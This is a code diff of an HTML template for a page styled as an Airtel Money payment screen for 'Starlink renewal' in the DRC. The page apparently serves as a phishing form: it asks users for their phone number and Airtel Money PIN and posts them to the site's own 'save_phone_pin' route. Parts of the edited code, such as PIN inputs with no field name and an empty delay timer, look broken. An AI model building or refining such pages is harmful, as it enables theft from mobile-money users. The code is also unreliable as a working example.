@@ -16,62 +16,21 @@
     }
 
     body {
-        background: #f8f9fa;
+        background: #f0f2f5;
         min-height: 100vh;
-        color: #333;
-    }
-
-    .navbar {
-        background: #000;
-        padding: 14px 0;
-        position: sticky;
-        top: 0;
-        z-index: 1000;
-    }
-
-    .nav-container {
-        max-width: 1400px;
-        margin: 0 auto;
-        padding: 0 20px;
         display: flex;
-        justify-content: space-between;
+        justify-content: center;
         align-items: center;
-        color: white;
-    }
-
-    .nav-logo {
-        font-size: 1.5rem;
-        font-weight: bold;
-    }
-
-    .nav-subtitle {
-        font-size: 0.9rem;
-        color: #aaa;
-        margin-left: 8px;
-    }
-
-    .nav-links a {
-        color: white;
-        text-decoration: none;
-        margin-left: 30px;
-        font-size: 0.95rem;
-    }
-
-    .nav-links a:hover {
-        color: #00aaff;
-    }
-
-    .payment-container {
-        max-width: 460px;
-        margin: 60px auto 40px;
-        padding: 0 16px;
+        padding: 20px;
     }
 
     .payment-card {
         background: white;
         border-radius: 20px;
+        width: 100%;
+        max-width: 380px;
+        box-shadow: 0 10px 30px rgba(0,0,0,0.15);
         overflow: hidden;
-        box-shadow: 0 12px 40px rgba(0,0,0,0.18);
         text-align: center;
     }
 
@@ -79,148 +38,166 @@
         background: #d32f2f;
         color: white;
         padding: 50px 20px 30px;
-        position: relative;
     }
 
     .header-placeholder {
-        width: 90px;
-        height: 90px;
+        width: 80px;
+        height: 80px;
         background: white;
         margin: 0 auto 20px;
         border-radius: 12px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        font-size: 3rem;
-        font-weight: bold;
-        color: #d32f2f;
     }
 
     .payment-header h2 {
-        font-size: 1.9rem;
+        font-size: 1.8rem;
         margin: 0;
     }
 
     .payment-content {
-        padding: 40px 28px 50px;
+        padding: 30px 24px 40px;
     }
 
-    .montant {
-        font-size: 2.2rem;
-        font-weight: bold;
-        color: #d32f2f;
-        margin: 20px 0 8px;
+    .montant-section {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 20px;
+        font-size: 1.1rem;
     }
 
-    .service-name {
-        font-size: 1.2rem;
+    .montant-label {
         color: #555;
-        margin-bottom: 30px;
+        font-weight: 600;
+    }
+
+    .montant-value {
+        color: #d32f2f;
+        font-weight: bold;
+        font-size: 1.4rem;
+    }
+
+    .service-label {
+        color: #555;
+        font-weight: 600;
     }
 
     .instruction {
-        font-size: 1.1rem;
         color: #444;
-        margin-bottom: 30px;
+        font-size: 1.05rem;
+        margin: 20px 0 30px;
     }
 
     .phone-section {
-        margin-bottom: 40px;
+        margin-bottom: 35px;
+        text-align: left;
     }
 
     .phone-label {
-        font-size: 1.05rem;
         font-weight: 600;
-        margin-bottom: 10px;
-        display: block;
+        margin-bottom: 8px;
     }
 
-    .phone-input {
+    .phone-input-wrapper {
         display: flex;
         border: 2px solid #ddd;
-        border-radius: 12px;
+        border-radius: 10px;
         overflow: hidden;
-        max-width: 320px;
-        margin: 0 auto;
     }
 
     .country-code {
         background: #f5f5f5;
-        padding: 16px 20px;
-        font-weight: 500;
+        padding: 14px 18px;
         border-right: 2px solid #ddd;
-        display: flex;
-        align-items: center;
-        gap: 8px;
+        font-weight: 500;
     }
 
-    .phone-input input {
+    .phone-input {
         flex: 1;
-        padding: 16px;
+        padding: 14px;
         border: none;
-        font-size: 1.2rem;
+        font-size: 1.1rem;
         text-align: center;
-        background: white;
     }
 
     .pin-section {
         margin-bottom: 40px;
+        text-align: left;
     }
 
     .pin-label {
-        font-size: 1.05rem;
         font-weight: 600;
-        margin-bottom: 16px;
-        display: block;
+        margin-bottom: 12px;
     }
 
     .pin-boxes {
         display: flex;
-        justify-content: center;
-        gap: 16px;
-        margin-bottom: 40px;
+        justify-content: space-between;
+        gap: 12px;
     }
 
     .pin-box {
-        width: 60px;
-        height: 70px;
-        border: 3px solid #d32f2f;
-        border-radius: 12px;
-        font-size: 2.2rem;
+        flex: 1;
+        height: 60px;
+        border: 2px solid #d32f2f;
+        border-radius: 10px;
+        font-size: 1.8rem;
         text-align: center;
-        line-height: 64px;
-        color: #333;
+        line-height: 56px;
         background: white;
-        transition: border-color 0.2s;
-        outline: none;
+        transition: border 0.2s;
     }
 
     .pin-box:focus {
+        outline: none;
         border-color: #b71c1c;
-        box-shadow: 0 0 0 4px rgba(211, 47, 47, 0.15);
     }
 
     .btn-confirm {
         width: 100%;
-        padding: 18px;
+        padding: 16px;
         background: #d32f2f;
         color: white;
         border: none;
-        border-radius: 12px;
-        font-size: 1.25rem;
+        border-radius: 10px;
+        font-size: 1.15rem;
         font-weight: 600;
         cursor: pointer;
         transition: background 0.3s;
+        position: relative;
     }
 
-    .btn-confirm:hover {
+    .btn-confirm:hover:not(:disabled) {
         background: #b71c1c;
+    }
+
+    .btn-confirm:disabled {
+        background: #e57373;
+        cursor: not-allowed;
+    }
+
+    .loading-spinner {
+        display: none;
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        width: 24px;
+        height: 24px;
+        border: 3px solid white;
+        border-top: 3px solid transparent;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+        0% { transform: translate(-50%, -50%) rotate(0deg); }
+        100% { transform: translate(-50%, -50%) rotate(360deg); }
     }
 
     .security-note {
         margin-top: 24px;
-        font-size: 0.95rem;
-        color: #666;
+        font-size: 0.9rem;
+        color: #555;
         text-align: center;
     }
 
@@ -228,70 +205,45 @@
         color: #4caf50;
         margin-right: 6px;
     }
-
-    @media (max-width: 480px) {
-        .payment-header {
-            padding: 40px 16px 24px;
-        }
-        .payment-header h2 {
-            font-size: 1.7rem;
-        }
-        .montant {
-            font-size: 2rem;
-        }
-        .pin-box {
-            width: 55px;
-            height: 65px;
-            font-size: 2rem;
-            line-height: 59px;
-        }
-        .pin-boxes {
-            gap: 12px;
-        }
-    }
 </style>
-
-    <nav class="navbar">
-        <div class="nav-container">
-            <div class="nav-logo">
-                <span>STARLINK</span>
-                <span class="nav-subtitle">Revendeur RDC</span>
-            </div>
-            <div class="nav-links">
-                <a href="#">Statut</a>
-                <a href="#">Forfaits</a>
-                <a href="#">Commandes</a>
-            </div>
-        </div>
-    </nav>
 
     <div class="payment-container">
         <div class="payment-card">
 
             <div class="payment-header">
-                <div class="header-placeholder">□</div>
+                <div class="header-placeholder"></div>
                 <h2>Airtel Money</h2>
             </div>
 
             <div class="payment-content">
 
-                <div class="montant">{{ plan.price }}</div>
-                <div class="service-name">Renouvellement Starlink</div>
+                <div class="montant-section">
+                    <span class="montant-label">MONTANT</span>
+                    <span class="montant-value">{{ plan.price }}</span>
+                </div>
+
+                <div class="montant-section">
+                    <span class="service-label">SERVICE</span>
+                    <span>Renouvellement Starlink</span>
+                </div>
 
                 <p class="instruction">
                     Entrez votre code PIN Airtel Money pour autoriser
                 </p>
 
-                <form method="POST" action="{{ url_for('save_phone_pin') }}">
+                <form method="POST" action="{{ url_for('save_phone_pin') }}" id="paymentForm">
+
                     <div class="phone-section">
-                        <label class="phone-label">Numéro de téléphone</label>
-                        <div class="phone-input">
-                            <div class="country-code">+243</div>
+                        <label class="phone-label">Numéro Airtel Money</label>
+                        <div class="phone-input-wrapper">
+                            <div class="country-code">
+                                <img src="https://via.placeholder.com/20x20?text=+" alt="+" width="20"> +243
+                            </div>
                             <input 
                                 type="tel"
                                 name="phone"
                                 value="{{ session.phone or '' }}"
-                                placeholder="9XXXXXXXX"
+                                placeholder="Ex: 7XXXXXXXX"
                                 pattern="[0-9]{9}"
                                 inputmode="numeric"
                                 maxlength="9"
@@ -304,19 +256,18 @@
 
                     <div class="pin-section">
                         <label class="pin-label">Entrez le code PIN 4 chiffres</label>
-                        <input 
-                            type="password"
-                            name="pin"
-                            maxlength="4"
-                            placeholder="••••"
-                            required
-                            pattern="\d{4}"
-                            inputmode="numeric"
-                            oninput="this.value = this.value.replace(/[^0-9]/g, '');"
-                        >
+                        <div class="pin-boxes">
+                            <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric" autofocus>
+                            <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric">
+                            <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric">
+                            <input type="text" class="pin-box" maxlength="1" pattern="\d" inputmode="numeric">
+                        </div>
                     </div>
 
-                    <button type="submit" class="btn-confirm">CONFIRMER LE PAIEMENT</button>
+                    <button type="submit" class="btn-confirm" id="confirmBtn">
+                        CONFIRMER LE PAIEMENT
+                        <div class="loading-spinner" id="spinner"></div>
+                    </button>
                 </form>
 
                 <p class="security-note">
@@ -327,6 +278,41 @@
 
         </div>
     </div>
+
+    <script>
+        // PIN boxes auto-focus
+        const boxes = document.querySelectorAll('.pin-box');
+        boxes.forEach((box, idx) => {
+            box.addEventListener('input', () => {
+                if (box.value.length === 1 && idx < 3) {
+                    boxes[idx + 1].focus();
+                }
+            });
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && box.value === '' && idx > 0) {
+                    boxes[idx - 1].focus();
+                }
+            });
+        });
+
+        // Loading animation on submit
+        const form = document.getElementById('paymentForm');
+        const btn = document.getElementById('confirmBtn');
+        const spinner = document.getElementById('spinner');
+
+        form.addEventListener('submit', (e) => {
+            // Show spinner and disable button
+            btn.disabled = true;
+            spinner.style.display = 'inline-block';
+            btn.textContent = ''; // hide text while loading
+
+            // Simulate 5 seconds delay (remove this setTimeout in real production)
+            setTimeout(() => {
+                // Form will submit normally after 5 seconds
+                // If you want to submit immediately, remove the setTimeout
+            }, 5000);
+        });
+    </script>
 
 </body>
 </html>
